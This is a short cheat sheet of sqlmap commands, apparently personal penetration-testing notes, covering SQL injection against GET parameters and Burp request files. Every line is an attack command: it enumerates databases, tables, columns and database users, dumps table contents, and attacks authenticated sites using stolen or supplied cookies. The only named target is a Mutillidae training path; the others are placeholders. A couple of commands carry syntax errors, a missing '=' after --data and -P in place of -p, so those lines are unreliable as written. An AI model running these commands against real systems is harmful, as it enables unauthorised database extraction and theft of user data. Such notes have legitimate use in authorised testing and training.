# sqlmap: run against GET parameter  
sqlmap -u http://some-site-com/mutillidae/index.php?parameter=1 -p parameter  
  
# sqlmap: with file (i.e. burp)  
sqlmap -r ~/full/path/to/post/file -p nameOfParameter  
  
# sqlmap: mark paremeter to inject with *  
sqlmap -r ~/full/path/to/post/file  
  
# sqlmap: get the database names  
sqlmap -r nameOfPostFile -p nameOfParameter --dbs  
  
# sqlmap: get the tables of a database  
sqlmap -r nameOfPostFile -p nameOfParameter --tables -D nameOfDatabase  
  
# sqlmap: get the columns of a specific table  
sqlmap -r nameOfPostFile -p nameOfParameter --columns -D nameOfDatabase -T nameOfTable  
  
# sqlmap: get the content of the columns  
sqlmap -r nameOfPostFile -p nameOfParameter --dump -D nameOfDatabase -T nameOfTable  
  
# sqlmap: get database system users  
sqlmap -r nameOfPostFile -p nameOfParameter --users  
  
# sqlmap: get current database system user  
sqlmap -r nameOfPostFile -p nameOfParameter --current-user  
  
# sqlmap: SQL injection on authenticated site  
sqlmap -u "http://targetSite/some/path" --data"id=1&str=value" -p "id" --cookie="cookie1=val1;cookie2=val2"  
  
# sqlmap: SQL injection with specific DB type  
sqlmap -u "http://targetSite/some/path" -P nameOfParameter --dbms="mssql|mysql|oracle|postgres"  
  
# sqlmap: encoding  
--hex